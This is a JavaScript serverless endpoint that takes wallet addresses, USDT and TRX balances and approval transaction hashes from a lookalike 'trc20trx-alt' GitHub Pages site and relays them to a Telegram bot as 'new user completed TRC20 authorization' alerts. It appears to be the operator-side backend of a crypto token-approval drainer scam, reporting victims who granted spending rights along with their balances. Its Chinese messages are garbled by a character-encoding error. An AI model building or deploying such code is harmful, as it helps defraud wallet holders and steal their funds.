module.exports = async function handler(req, res) {
  const allowedOrigin = "https://trc20trx-alt.github.io";
  res.setHeader("Access-Control-Allow-Origin", allowedOrigin);
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ error: "åªæ”¯æŒPOSTè¯·æ±‚" });
  }

  const { address, tokenBalance, trxBalance, approveTime, txHash } = req.body;
  if (!address || !tokenBalance) {
    return res.status(400).json({ error: "ç¼ºå°‘å…³é”®æˆæƒæ•°æ®ï¼ˆaddress/tokenBalanceï¼‰" });
  }

  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return res.status(500).json({ error: "åç«¯æœªé…ç½®Telegramç¯å¢ƒå˜é‡" });
  }

  const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  try {
    // ä½¿ç”¨ Markdown æ ¼å¼çš„é“¾æ¥
    const message = `
ğŸ”” æ–°ç”¨æˆ·å®ŒæˆTRC20æˆæƒï¼
ğŸ“Œ æˆæƒåœ°å€ï¼š${address}
ğŸ’µ USDTä½™é¢ï¼š${tokenBalance ?? "æœªè·å–"} USDT
ğŸª™ TRXä½™é¢ï¼š${trxBalance ?? "æœªè·å–"} TRX
â° æˆæƒæ—¶é—´ï¼š${approveTime ?? new Date().toLocaleString()}
ğŸ”— äº¤æ˜“å“ˆå¸Œï¼š${txHash ? `[${txHash}](https://tronscan.org/#/transaction/${txHash})` : "æœªæä¾›"}
    `;

    const response = await fetch(TELEGRAM_API_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "Markdown", // ä½¿ç”¨ Markdown
        disable_web_page_preview: false,
      }),
    });

    if (!response.ok) {
      throw new Error(`Telegram APIå“åº”å¼‚å¸¸ï¼š${response.status}`);
    }

    res.status(200).json({ success: true, message: "Telegramé€šçŸ¥å·²å‘é€" });
  } catch (error) {
    console.error("é€šçŸ¥å¤±è´¥ï¼š", error);
    res.status(500).json({ error: "é€šçŸ¥å‘é€å¤±è´¥", detail: error.message });
  }
};
